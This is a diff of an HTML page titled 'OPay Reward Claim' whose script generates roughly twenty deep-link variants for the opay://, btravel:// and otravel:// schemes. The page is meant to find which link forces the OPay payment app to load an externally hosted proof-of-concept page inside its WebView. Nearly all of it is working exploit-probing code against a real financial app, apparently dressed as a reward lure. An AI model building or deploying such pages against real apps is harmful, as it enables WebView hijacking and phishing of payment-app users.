@@ -26,8 +26,8 @@
         .card {
             background: white;
             border-radius: 16px;
-            padding: 24px;
-            max-width: 380px;
+            padding: 20px;
+            max-width: 400px;
             width: 100%;
             text-align: center;
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
@@ -35,26 +35,38 @@
 
         h1 {
             color: #333;
-            font-size: 20px;
-            margin-bottom: 6px;
+            font-size: 18px;
+            margin-bottom: 4px;
         }
 
         .sub {
             color: #666;
-            font-size: 13px;
-            margin-bottom: 16px;
+            font-size: 12px;
+            margin-bottom: 12px;
+        }
+
+        .group-label {
+            text-align: left;
+            font-size: 11px;
+            font-weight: bold;
+            color: #00c853;
+            margin-top: 14px;
+            margin-bottom: 4px;
+            padding-left: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         .btn {
             display: block;
             width: 100%;
-            padding: 13px;
-            margin: 6px 0;
+            padding: 11px;
+            margin: 4px 0;
             color: white;
             text-decoration: none;
-            border-radius: 10px;
+            border-radius: 8px;
             font-weight: bold;
-            font-size: 14px;
+            font-size: 13px;
             border: none;
             cursor: pointer;
             -webkit-tap-highlight-color: transparent;
@@ -62,6 +74,7 @@
 
         .btn:active {
             transform: scale(0.97);
+            opacity: 0.9;
         }
 
         .g {
@@ -88,12 +101,22 @@
             background: #00838f;
         }
 
+        .dk {
+            background: #37474f;
+        }
+
+        .pk {
+            background: #e91e63;
+        }
+
         .label {
-            font-size: 10px;
-            color: #999;
-            margin-top: 2px;
-            margin-bottom: 8px;
+            font-size: 9px;
+            color: #aaa;
+            margin-top: 1px;
+            margin-bottom: 6px;
             word-break: break-all;
+            text-align: left;
+            padding: 0 4px;
         }
 
         .status {
@@ -107,66 +130,130 @@
 
 <body>
     <div class="card">
-        <div style="font-size:40px;margin-bottom:8px">🎁</div>
+        <div style="font-size:36px;margin-bottom:6px">🎁</div>
         <h1>OPay Reward Claim</h1>
         <div class="sub">Tap each button to test which opens WebView</div>
 
-        <a id="b1" class="btn g" href="#">1️⃣ schemedispatcher + scheme= (encoded)</a>
-        <div id="l1" class="label"></div>
+        <!-- GROUP A: opay:// scheme -->
+        <div class="group-label">🟢 Group A — opay:// scheme</div>
 
-        <a id="b2" class="btn b" href="#">2️⃣ schemedispatcher + scheme= (raw)</a>
-        <div id="l2" class="label"></div>
+        <a id="a1" class="btn g" href="#">A1: schemedispatcher?scheme= (encoded)</a>
+        <div id="la1" class="label"></div>
 
-        <a id="b3" class="btn p" href="#">3️⃣ webview?url= </a>
-        <div id="l3" class="label"></div>
+        <a id="a2" class="btn g" href="#">A2: schemedispatcher?scheme= (raw)</a>
+        <div id="la2" class="label"></div>
 
-        <a id="b4" class="btn o" href="#">4️⃣ open?url=</a>
-        <div id="l4" class="label"></div>
+        <a id="a3" class="btn g" href="#">A3: webview?url=</a>
+        <div id="la3" class="label"></div>
 
-        <a id="b5" class="btn r" href="#">5️⃣ /web?url=</a>
-        <div id="l5" class="label"></div>
+        <a id="a4" class="btn g" href="#">A4: applink?url=</a>
+        <div id="la4" class="label"></div>
 
-        <a id="b6" class="btn t" href="#">6️⃣ schemedispatcher?url=</a>
-        <div id="l6" class="label"></div>
+        <a id="a5" class="btn g" href="#">A5: open?url=</a>
+        <div id="la5" class="label"></div>
 
-        <a id="b7" class="btn g" href="#">7️⃣ Just the URL after scheme://</a>
-        <div id="l7" class="label"></div>
+        <a id="a6" class="btn g" href="#">A6: h5?url= (Chinese fintech)</a>
+        <div id="la6" class="label"></div>
 
-        <a id="b8" class="btn b" href="#">8️⃣ host/path style</a>
-        <div id="l8" class="label"></div>
+        <a id="a7" class="btn g" href="#">A7: browser?url=</a>
+        <div id="la7" class="label"></div>
+
+        <a id="a8" class="btn g" href="#">A8: host/path style</a>
+        <div id="la8" class="label"></div>
+
+        <!-- GROUP B: btravel:// scheme -->
+        <div class="group-label">🔵 Group B — btravel:// scheme</div>
+
+        <a id="b1" class="btn b" href="#">B1: schemedispatcher?scheme= (encoded)</a>
+        <div id="lb1" class="label"></div>
+
+        <a id="b2" class="btn b" href="#">B2: webview?url=</a>
+        <div id="lb2" class="label"></div>
+
+        <a id="b3" class="btn b" href="#">B3: h5?url=</a>
+        <div id="lb3" class="label"></div>
+
+        <!-- GROUP C: otravel:// with new params -->
+        <div class="group-label">🟣 Group C — otravel:// new params</div>
+
+        <a id="c1" class="btn p" href="#">C1: schemedispatcher?action_url=</a>
+        <div id="lc1" class="label"></div>
+
+        <a id="c2" class="btn p" href="#">C2: schemedispatcher?target_url=</a>
+        <div id="lc2" class="label"></div>
+
+        <a id="c3" class="btn p" href="#">C3: h5?url=</a>
+        <div id="lc3" class="label"></div>
+
+        <!-- GROUP D: opay:// additional paths -->
+        <div class="group-label">🟠 Group D — opay:// more paths</div>
+
+        <a id="d1" class="btn o" href="#">D1: page?url=</a>
+        <div id="ld1" class="label"></div>
+
+        <a id="d2" class="btn o" href="#">D2: navigate?url=</a>
+        <div id="ld2" class="label"></div>
+
+        <a id="d3" class="btn o" href="#">D3: web?url=</a>
+        <div id="ld3" class="label"></div>
+
+        <a id="d4" class="btn o" href="#">D4: schemedispatcher?url=</a>
+        <div id="ld4" class="label"></div>
+
+        <!-- GROUP E: raw URL as opay:// path -->
+        <div class="group-label">🔴 Group E — Direct URL as path</div>
+
+        <a id="e1" class="btn r" href="#">E1: opay://https://...</a>
+        <div id="le1" class="label"></div>
+
+        <a id="e2" class="btn r" href="#">E2: opay:// + action_url param</a>
+        <div id="le2" class="label"></div>
 
         <div class="status" id="status"></div>
     </div>
 
     <script>
-        var POC = "https://zugonwobi.github.io/opay-rewards/poc.html?v=" + Date.now();
+        var POC = "https://zugonwobi.github.io/test/poc.html?v=" + Date.now();
+        var ENC = encodeURIComponent(POC);
 
-        // All the deep link format variations to test
         var links = {
-            // 1. Original: otravel://schemedispatcher?scheme=<encoded_url>
-            b1: "otravel://schemedispatcher?scheme=" + encodeURIComponent(POC),
-            // 2. Same but URL NOT encoded
-            b2: "otravel://schemedispatcher?scheme=" + POC,
-            // 3. Common WebView pattern
-            b3: "otravel://webview?url=" + encodeURIComponent(POC),
-            // 4. Open pattern
-            b4: "otravel://open?url=" + encodeURIComponent(POC),
-            // 5. Web pattern
-            b5: "otravel://web?url=" + encodeURIComponent(POC),
-            // 6. schemedispatcher but with url= param instead of scheme=
-            b6: "otravel://schemedispatcher?url=" + encodeURIComponent(POC),
-            // 7. Direct URL as path: otravel://https://...
-            b7: "otravel://" + POC,
-            // 8. Host/path style: otravel://zugonwobi.github.io/opay-rewards/poc.html
-            b8: "otravel://zugonwobi.github.io/opay-rewards/poc.html?v=" + Date.now()
+            // GROUP A: opay:// scheme (NONE of these were tested before!)
+            a1: "opay://schemedispatcher?scheme=" + ENC,
+            a2: "opay://schemedispatcher?scheme=" + POC,
+            a3: "opay://webview?url=" + ENC,
+            a4: "opay://applink?url=" + ENC,
+            a5: "opay://open?url=" + ENC,
+            a6: "opay://h5?url=" + ENC,
+            a7: "opay://browser?url=" + ENC,
+            a8: "opay://zugonwobi.github.io/test/poc.html?v=" + Date.now(),
+
+            // GROUP B: btravel:// scheme
+            b1: "btravel://schemedispatcher?scheme=" + ENC,
+            b2: "btravel://webview?url=" + ENC,
+            b3: "btravel://h5?url=" + ENC,
+
+            // GROUP C: otravel:// with NEW parameter names
+            c1: "otravel://schemedispatcher?action_url=" + ENC,
+            c2: "otravel://schemedispatcher?target_url=" + ENC,
+            c3: "otravel://h5?url=" + ENC,
+
+            // GROUP D: opay:// more path patterns
+            d1: "opay://page?url=" + ENC,
+            d2: "opay://navigate?url=" + ENC,
+            d3: "opay://web?url=" + ENC,
+            d4: "opay://schemedispatcher?url=" + ENC,
+
+            // GROUP E: Direct URL as path
+            e1: "opay://" + POC,
+            e2: "opay://schemedispatcher?action_url=" + ENC
         };
 
         for (var id in links) {
             var el = document.getElementById(id);
-            var lbl = document.getElementById("l" + id.replace("b", ""));
+            var lbl = document.getElementById("l" + id);
             if (el) {
                 el.href = links[id];
-                if (lbl) lbl.innerText = links[id].substring(0, 120);
+                if (lbl) lbl.innerText = links[id].substring(0, 140);
             }
         }
     </script>
